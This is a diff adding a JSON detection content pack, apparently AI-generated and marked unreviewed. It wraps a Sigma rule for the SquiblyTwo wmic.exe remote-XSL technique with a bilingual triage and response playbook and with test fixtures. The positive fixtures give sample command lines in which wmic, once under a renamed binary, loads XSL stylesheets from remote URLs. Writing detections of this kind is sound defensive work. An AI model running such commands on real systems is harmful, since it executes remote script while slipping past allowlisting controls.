@@ -1,0 +1,139 @@
+{
+  "rule": {
+    "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
+    "title": "Potential Remote SquiblyTwo Technique Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Markus Neis, Florian Roth, Swachchhanda Shrawan Poudel (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1047",
+      "T1059.005",
+      "T1059.007",
+      "T1220"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó wmic.exe, o una copia renombrada identificada por OriginalFileName o imphash, con un parámetro /format: que apunta a una URL o a una ruta UNC. Este patrón coincide con la técnica SquiblyTwo, que carga y ejecuta un XSL remoto con scripts embebidos.",
+      "what_it_detects": "Eventos de creación de procesos de wmic.exe, identificado por Image, OriginalFileName o imphash en Hashes, cuyo CommandLine contiene '/format:' (o una variante con '-' u otro guion) junto con '://' o una ruta UNC '\\\\'.",
+      "why_it_matters": "SquiblyTwo usa wmic.exe, un binario firmado de Windows, para procesar XSL con JScript o VBScript en memoria. Así evade el application whitelisting y ejecuta código (T1220, T1047, T1059.005, T1059.007).",
+      "triage_steps": [
+        "Revise el CommandLine completo y extraiga la URL o la ruta UNC indicada en /format:. Anote el dominio, la IP y el nombre del archivo XSL.",
+        "Compare Image con OriginalFileName y Hashes. Si wmic.exe se ejecuta desde una ruta distinta de System32\\wbem o SysWOW64\\wbem, se trata de un binario renombrado, lo que es muy sospechoso.",
+        "Examine ParentImage y la línea de comandos del padre. Office, navegadores, mshta, scripts o servicios inusuales indican un acceso inicial o una persistencia.",
+        "Busque procesos hijos de wmic.exe y conexiones de red del mismo host en un margen de +/- 15 minutos hacia el destino remoto.",
+        "Consulte la reputación del dominio o la IP y busque la misma URL en proxy, DNS y otros endpoints.",
+        "Valide con el usuario o con el equipo de TI si el comando forma parte de un script de administración documentado.",
+        "Revise si hubo alertas previas para el mismo host o usuario, como relacionadas con mshta, regsvr32 o descargas sospechosas."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Scripts de inventario o administración que usan hojas XSL personalizadas alojadas en un recurso compartido UNC interno.",
+        "Ejercicios de red team o pruebas de Atomic Red Team (T1220) autorizados."
+      ],
+      "response_steps": [
+        "Confirme la actividad maliciosa: obtenga el XSL desde el proxy o la caché, o descárguelo de forma aislada, y analice el script embebido sin ejecutarlo.",
+        "Si se confirma, aísle el endpoint y bloquee el dominio, la IP o la ruta UNC en el proxy, el firewall y el EDR.",
+        "Identifique y detenga los procesos hijos y elimine los mecanismos de persistencia creados, después de documentar la evidencia.",
+        "Restablezca las credenciales del usuario afectado y busque el mismo indicador en toda la flota.",
+        "Considere restringir wmic.exe mediante WDAC o AppLocker en los equipos que no lo necesiten."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque la carga de XSL remotos con wmic.exe casi nunca es legítima y equivale a ejecutar código que evade los controles."
+    },
+    "en": {
+      "summary": "wmic.exe, or a renamed copy identified by OriginalFileName or imphash, ran with a /format: argument that points to a URL or a UNC path. This matches the SquiblyTwo technique, which loads and runs a remote XSL file containing embedded script.",
+      "what_it_detects": "Process creation events for wmic.exe, identified by Image, OriginalFileName or imphash in Hashes, where CommandLine contains '/format:' (or a dash variant) plus either '://' or a UNC '\\\\' path.",
+      "why_it_matters": "SquiblyTwo uses wmic.exe, a signed Windows binary, to process XSL with JScript or VBScript in memory. This bypasses application allowlisting and runs code (T1220, T1047, T1059.005, T1059.007).",
+      "triage_steps": [
+        "Read the full CommandLine and extract the URL or UNC path given in /format:. Record the domain, the IP and the XSL file name.",
+        "Compare Image with OriginalFileName and Hashes. A wmic binary running outside System32\\wbem or SysWOW64\\wbem has been renamed and is highly suspicious.",
+        "Review ParentImage and the parent's command line. Office apps, browsers, mshta, script hosts or unusual services point to initial access or persistence.",
+        "On the same host within +/- 15 minutes, look for wmic.exe child processes and for network connections to the remote destination.",
+        "Check the reputation of the domain or IP and search proxy, DNS and other endpoints for the same URL.",
+        "Ask the user or IT whether a documented admin script runs this command.",
+        "Check for earlier alerts on the same host or user, such as mshta, regsvr32 or suspicious downloads."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Inventory or admin scripts that use custom XSL stylesheets hosted on an internal UNC share.",
+        "Authorized red team exercises or Atomic Red Team T1220 tests."
+      ],
+      "response_steps": [
+        "Confirm the activity is malicious: get the XSL from proxy logs or cache, or fetch it in a sandbox, and analyze the embedded script without running it.",
+        "If confirmed, isolate the endpoint and block the domain, IP or UNC path at the proxy, the firewall and the EDR.",
+        "After preserving evidence, stop the child processes and remove any persistence they created.",
+        "Reset the affected user's credentials and hunt for the indicator across the fleet.",
+        "Consider restricting wmic.exe with WDAC or AppLocker on hosts that do not need it."
+      ],
+      "severity_rationale": "High fits because loading a remote XSL file with wmic.exe is almost never legitimate and amounts to code execution that evades controls."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Native wmic.exe loads an XSL stylesheet from a remote HTTPS URL, launched by Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic os get /format:\"https://example.com/files/report.xsl\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000,IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E"
+        }
+      },
+      {
+        "description": "Renamed wmic binary, caught by OriginalFileName, uses the dash form -format: with an HTTP URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\svchelper.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "svchelper.exe process list brief -format:\"http://198.51.100.20/a.xsl\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "Hashes": "IMPHASH=37777A96245A3C74EB217308F3546F4C"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal wmic inventory query using a built-in local format, with no URL or UNC path",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\soporte",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic computersystem get model,name /format:list",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "Hashes": "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E"
+        }
+      },
+      {
+        "description": "wmic exports to CSV using a local XSL file path rather than a remote one",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-INV-01.andes.example.com",
+          "User": "ANDES\\svc_inventario",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic product get name,version /format:\"C:\\Windows\\System32\\wbem\\en-US\\csv.xsl\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "Hashes": "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
